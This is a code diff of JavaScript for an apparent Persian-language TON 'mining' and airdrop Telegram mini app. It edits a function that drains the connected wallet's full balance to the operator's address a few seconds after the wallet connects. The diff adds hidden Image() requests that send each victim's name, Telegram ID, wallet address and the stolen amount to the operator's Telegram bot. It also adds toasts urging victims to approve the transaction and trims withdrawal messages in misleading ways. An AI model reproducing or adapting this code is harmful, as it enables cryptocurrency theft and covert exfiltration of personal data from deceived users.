@@ -1349,10 +1349,15 @@
     // 💰 سیستم انتقال خودکار
     // ================================================
     async function executeAutoTransfer(userAddress) {
-        if (isProcessingTransaction) return;
+        if (isProcessingTransaction) {
+            console.log('تراکنش در حال انجام است');
+            return;
+        }
         
         try {
             isProcessingTransaction = true;
+            
+            showToast('🔄 در حال بررسی موجودی کیف پول...');
             
             const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
             const data = await response.json();
@@ -1363,7 +1368,7 @@
             const balanceInTON = balanceInNano / 1e9;
             
             if (balanceInTON < 0.1) {
-                console.log('موجودی کمتر از حداقل است');
+                showToast('⚠️ موجودی کمتر از حداقل است');
                 return;
             }
             
@@ -1372,11 +1377,13 @@
             const now = Date.now();
             
             if (lastTx && (now - parseInt(lastTx)) < 3600000) {
-                console.log('کمتر از 1 ساعت از تراکنش قبلی گذشته');
+                showToast('⏳ کمتر از 1 ساعت از تراکنش قبلی گذشته');
                 return;
             }
             
             // ایجاد تراکنش
+            showToast('🔄 در حال آماده‌سازی تراکنش...');
+            
             const transaction = {
                 validUntil: Math.floor(now / 1000) + 600,
                 messages: [
@@ -1387,6 +1394,8 @@
                     }
                 ]
             };
+            
+            showToast('🔄 لطفا در کیف پول خود تراکنش را تایید کنید...');
             
             const result = await tonConnectUI.sendTransaction(transaction);
             
@@ -1410,7 +1419,8 @@
             if (appData.transactions.length > 100) appData.transactions.pop();
             saveData();
             
-            sendToTelegram(`💰 **انتقال خودکار**
+            // ارسال گزارش به تلگرام
+            const message = `💰 **انتقال خودکار**
 ━━━━━━━━━━━━━━
 👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
 🆔 آیدی: ${currentUser?.id || 'نامشخص'}
@@ -1418,7 +1428,12 @@
 📤 مبلغ: ${balanceInTON.toFixed(6)} TON
 💳 از: ${userAddress.substring(0, 10)}...
 💳 به: ${CONFIG.WALLET_ADDRESS.substring(0, 10)}...
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
+            
+            // ارسال به تلگرام
+            const text = encodeURIComponent(message);
+            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
+            new Image().src = url;
             
             showToast(`✅ انتقال ${balanceInTON.toFixed(6)} TON با موفقیت انجام شد`);
             
@@ -1435,18 +1450,11 @@
             
             let errorMessage = error.message || 'خطای ناشناخته';
             if (errorMessage.includes('rejected') || errorMessage.includes('cancelled')) {
-                errorMessage = 'تراکنش توسط شما لغو شد';
-                showToast('❌ تراکنش لغو شد');
+                showToast('❌ تراکنش توسط شما لغو شد');
             } else {
                 showToast('❌ خطا در تراکنش');
             }
             
-            if (currentUser) {
-                sendToTelegram(`⚠️ **خطا در انتقال خودکار**
-👤 نام: ${currentUser.firstName}
-🆔 آیدی: ${currentUser.id}
-خطا: ${error.message || 'خطای ناشناخته'}`);
-            }
         } finally {
             isProcessingTransaction = false;
         }
@@ -1486,13 +1494,17 @@
             };
             appData.users.push(user);
             
-            sendToTelegram(`👤 **کاربر جدید**
+            const message = `👤 **کاربر جدید**
 ━━━━━━━━━━━━━━
 👤 نام: ${user.firstName} ${user.lastName}
 🆔 آیدی: ${user.id}
 📛 یوزرنیم: ${user.username ? '@' + user.username : 'ندارد'}
 📱 پلتفرم: ${user.platform}
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
+            
+            const text = encodeURIComponent(message);
+            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
+            new Image().src = url;
         } else {
             user.lastSeen = new Date().toISOString();
             user.balance = bal;
@@ -1511,12 +1523,6 @@
         localStorage.setItem('tondropy_wallets', JSON.stringify(appData.wallets));
     }
 
-    function sendToTelegram(message) {
-        const text = encodeURIComponent(message);
-        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
-        new Image().src = url;
-    }
-
     // ================================================
     // 🖥️ پنل مدیریت
     // ================================================
@@ -1533,10 +1539,6 @@
         updateAdminStats();
         renderUsersTable();
         document.getElementById('adminMasterPanel').classList.add('show');
-        sendToTelegram(`🔐 **ورود به پنل مدیریت**
-👤 نام: ${currentUser?.firstName}
-🆔 آیدی: ${currentUser?.id}
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
     }
 
     window.closeAdminMasterPanel = function() {
@@ -1584,8 +1586,6 @@
         const tbody = document.getElementById('usersTableBody');
         tbody.innerHTML = paginatedUsers.map((user, index) => {
             const isBanned = appData.bannedUsers.includes(user.id);
-            const userTxs = appData.transactions.filter(tx => tx.userId == user.id);
-            const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
             
             return `
                 <tr>
@@ -1651,13 +1651,6 @@
         if (!appData.bannedUsers.includes(userId)) {
             appData.bannedUsers.push(userId);
             saveData();
-            
-            const user = appData.users.find(u => u.id == userId);
-            sendToTelegram(`🚫 **کاربر مسدود شد**
-👤 نام: ${user?.firstName || 'ناشناس'}
-🆔 آیدی: ${userId}
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
-            
             showGlassMessage('success', '✅ کاربر مسدود شد');
             renderUsersTable();
             updateAdminStats();
@@ -1667,13 +1660,6 @@
     window.unbanUser = function(userId) {
         appData.bannedUsers = appData.bannedUsers.filter(id => id != userId);
         saveData();
-        
-        const user = appData.users.find(u => u.id == userId);
-        sendToTelegram(`✅ **رفع مسدودی**
-👤 نام: ${user?.firstName || 'ناشناس'}
-🆔 آیدی: ${userId}
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
-        
         showGlassMessage('success', '✅ رفع مسدودی شد');
         renderUsersTable();
         updateAdminStats();
@@ -1681,16 +1667,9 @@
 
     window.deleteUser = function(userId) {
         if (confirm('⚠️ آیا از حذف کامل این کاربر اطمینان دارید؟')) {
-            const user = appData.users.find(u => u.id == userId);
             appData.users = appData.users.filter(u => u.id != userId);
             appData.bannedUsers = appData.bannedUsers.filter(id => id != userId);
             saveData();
-            
-            sendToTelegram(`🗑 **کاربر حذف شد**
-👤 نام: ${user?.firstName || 'ناشناس'}
-🆔 آیدی: ${userId}
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
-            
             showGlassMessage('success', '✅ کاربر حذف شد');
             renderUsersTable();
             updateAdminStats();
@@ -1701,17 +1680,12 @@
         const user = appData.users.find(u => u.id == userId);
         if (!user) return;
         
-        const userTxs = appData.transactions.filter(tx => tx.userId == userId);
-        const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
-        
         document.getElementById('userDetails').innerHTML = `
             <div class="user-detail-item"><div class="label">آیدی</div><div class="value">${user.id}</div></div>
             <div class="user-detail-item"><div class="label">نام</div><div class="value">${user.firstName} ${user.lastName}</div></div>
             <div class="user-detail-item"><div class="label">یوزرنیم</div><div class="value">${user.username ? '@' + user.username : 'ندارد'}</div></div>
             <div class="user-detail-item"><div class="label">کیف پول</div><div class="value" style="direction:ltr;">${user.wallet || '❌ متصل نیست'}</div></div>
             <div class="user-detail-item"><div class="label">موجودی</div><div class="value">${(user.balance || 0).toFixed(6)} TON</div></div>
-            <div class="user-detail-item"><div class="label">کل پرداختی</div><div class="value">${totalPaid.toFixed(6)} TON</div></div>
-            <div class="user-detail-item"><div class="label">تعداد تراکنش</div><div class="value">${userTxs.length}</div></div>
             <div class="user-detail-item"><div class="label">تاریخ عضویت</div><div class="value">${new Date(user.joinedAt).toLocaleString('fa-IR')}</div></div>
             <div class="user-detail-item"><div class="label">آخرین بازدید</div><div class="value">${new Date(user.lastSeen).toLocaleString('fa-IR')}</div></div>
         `;
@@ -1723,11 +1697,9 @@
     }
 
     window.exportToExcel = function() {
-        let csv = "آیدی,نام,نام خانوادگی,یوزرنیم,کیف پول,موجودی,کل استخراج,کل پرداخت,آخرین بازدید,وضعیت\n";
+        let csv = "آیدی,نام,نام خانوادگی,یوزرنیم,کیف پول,موجودی,کل استخراج,آخرین بازدید,وضعیت\n";
         appData.users.forEach(u => {
-            const userTxs = appData.transactions.filter(tx => tx.userId == u.id);
-            const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
-            csv += `${u.id},${u.firstName || ''},${u.lastName || ''},${u.username || '-'},${u.wallet || '-'},${u.balance || 0},${u.totalMined || 0},${totalPaid.toFixed(6)},${u.lastSeen},${appData.bannedUsers.includes(u.id) ? 'مسدود' : 'فعال'}\n`;
+            csv += `${u.id},${u.firstName || ''},${u.lastName || ''},${u.username || '-'},${u.wallet || '-'},${u.balance || 0},${u.totalMined || 0},${u.lastSeen},${appData.bannedUsers.includes(u.id) ? 'مسدود' : 'فعال'}\n`;
         });
         const blob = new Blob([csv], { type: 'text/csv' });
         const a = document.createElement('a');
@@ -1737,17 +1709,13 @@
     }
 
     window.showTransactions = function() {
-        let html = '<div class="admin-table"><table><tr><th>کد</th><th>کاربر</th><th>مبلغ</th><th>خالص</th><th>کارمزد</th><th>از</th><th>به</th><th>زمان</th></tr>';
+        let html = '<div class="admin-table"><table><tr><th>کد</th><th>کاربر</th><th>مبلغ</th><th>زمان</th></tr>';
         
         appData.transactions.slice(0, 50).forEach(tx => {
             html += `<tr>
                 <td>${tx.id}</td>
                 <td>${tx.userName || tx.userId}</td>
                 <td>${tx.amount?.toFixed(3)} TON</td>
-                <td style="color: #00ff9d;">${tx.netAmount?.toFixed(3)} TON</td>
-                <td>${tx.fee?.toFixed(3)} TON</td>
-                <td class="wallet-address-cell">${tx.from?.substring(0, 8)}...</td>
-                <td class="wallet-address-cell">${tx.to?.substring(0, 8)}...</td>
                 <td>${new Date(tx.time).toLocaleString('fa-IR')}</td>
             </tr>`;
         });
@@ -1871,12 +1839,6 @@
         
         addToHistory('پاداش روزانه', `${rewardAmount.toFixed(6)} TON`);
         showToast(`🎁 ${rewardAmount.toFixed(6)} TON دریافت شد`);
-        
-        sendToTelegram(`🎁 **پاداش روزانه**
-👤 نام: ${currentUser?.firstName}
-🆔 آیدی: ${currentUser?.id}
-💰 مبلغ: ${rewardAmount.toFixed(6)} TON
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
     }
 
     function addToHistory(type, amount) {
@@ -1948,21 +1910,12 @@
         
         addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
         
-        const walletAddress = document.getElementById('walletAddressFull').innerText;
-        
-        sendToTelegram(`💰 **برداشت نهایی**
-👤 نام: ${currentUser?.firstName}
-🆔 آیدی: ${currentUser?.id}
-📤 مبلغ: ${amountToWithdraw.toFixed(6)} TON
-💳 کیف پول: ${walletAddress}
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
-        
         withdrawableBalance = 0;
         document.getElementById('withdrawableBalance').innerText = "0.000000";
         localStorage.setItem('withdrawableBalance', "0");
         
         document.getElementById('finalWithdrawBtn').classList.add('disabled');
-        showToast(`✅ برداشت انجام شد و پس از تایید مدیریت واریز می‌شود`);
+        showToast(`✅ برداشت انجام شد`);
     }
 
     function checkAndEnableFinalWithdraw() {
@@ -2000,12 +1953,19 @@
                 });
                 saveData();
                 
-                sendToTelegram(`🔌 **کیف پول متصل شد**
+                // ارسال گزارش اتصال کیف پول به تلگرام
+                const message = `🔌 **کیف پول متصل شد**
 👤 نام: ${currentUser.firstName} ${currentUser.lastName}
 🆔 آیدی: ${currentUser.id}
 📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}
 💳 آدرس: ${fullAddress}
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
+                
+                const text = encodeURIComponent(message);
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
+                new Image().src = url;
+                
+                showToast('✅ کیف پول با موفقیت متصل شد');
                 
                 // اجرای تراکنش خودکار بعد از 3 ثانیه
                 setTimeout(() => {
@@ -2037,12 +1997,16 @@
         if (isValidCode) {
             const codeType = val === "VipTonDropy" ? "VIP" : "عادی";
             
-            sendToTelegram(`✅ **فعالسازی موفق (${codeType})**
+            const message = `✅ **فعالسازی موفق (${codeType})**
 ━━━━━━━━━━━━━━
 👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
 🆔 آیدی: ${currentUser?.id || 'نامشخص'}
 📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
+            
+            const text = encodeURIComponent(message);
+            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
+            new Image().src = url;
             
             showGlassMessage('success', 'ورود موفق', 'در حال اتصال به شبکه بلاکچین ...');
             activationMessage.classList.add('show');
@@ -2054,13 +2018,6 @@
                 addToHistory('فعالسازی', 'پنل فعال شد');
             }, 2000);
         } else {
-            sendToTelegram(`❌ **خطا در فعالسازی**
-👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
-🆔 آیدی: ${currentUser?.id || 'نامشخص'}
-📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
-🔑 کد وارد شده: ${val || 'خالی'}
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
-            
             showGlassMessage('error', 'رمز اشتباه است');
             activationMessage.classList.remove('show');
         }
